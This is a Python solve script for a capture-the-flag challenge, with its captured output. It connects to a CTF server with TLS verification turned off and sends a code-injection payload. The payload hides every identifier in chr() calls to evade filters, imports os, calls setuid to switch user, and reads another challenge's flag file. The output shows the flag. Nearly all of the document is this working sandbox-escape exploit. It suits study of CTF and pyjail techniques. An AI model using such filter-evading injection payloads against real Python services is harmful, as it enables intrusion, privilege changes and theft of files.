import socket
import ssl
import time

HOST = "bctf-infra.opus4-7.b01le.rs"
PORT = 8443

def recv_some(sock, wait=0.6, total=10.0):
    time.sleep(wait)
    end = time.time() + total
    out = b""
    sock.settimeout(0.25)
    while time.time() < end:
        try:
            c = sock.recv(4096)
            if c:
                out += c
                print(c.decode("utf-8", "ignore"), end="")
        except Exception:
            pass
    return out.decode("utf-8", "ignore")

def main():
    ctx = ssl._create_unverified_context()
    s = ctx.wrap_socket(socket.socket(), server_hostname=HOST)
    s.connect((HOST, PORT))

    try:
        print(recv_some(s, 0.6, 1.0), end="")
        s.sendall(b"chal1\n")
        print(recv_some(s, 0.6, 1.0), end="")

        payload = (
            "__builtins__.__dict__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]"
            "(chr(111)+chr(115)).__dict__[chr(115)+chr(101)+chr(116)+chr(117)+chr(105)+chr(100)](65001);"
            "print(__builtins__.__dict__[chr(103)+chr(101)+chr(116)+chr(97)+chr(116)+chr(116)+chr(114)]("
            "__builtins__.__dict__[chr(111)+chr(112)+chr(101)+chr(110)]("
            "chr(47)+chr(97)+chr(112)+chr(112)+chr(47)+chr(99)+chr(104)+chr(97)+chr(108)+chr(115)+chr(47)+chr(99)+chr(104)+chr(97)+chr(108)+chr(51)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),"
            "chr(114)+chr(101)+chr(97)+chr(100))())"
        )

        s.sendall(payload.encode() + b"\n")
        print(recv_some(s, 1.0, 15.0), end="")
    finally:
        s.close()

if __name__ == "__main__":
    main()

# Output :
# Challenges:
# chal3
# chal1
# chal2
# > Challenges:
# chal3
# chal1
# chal2
# > chal1:
# > chal1:
# > bctf{perfect_infrastructure_tm_f6634b38}
# bctf{perfect_infrastructure_tm_f6634b38}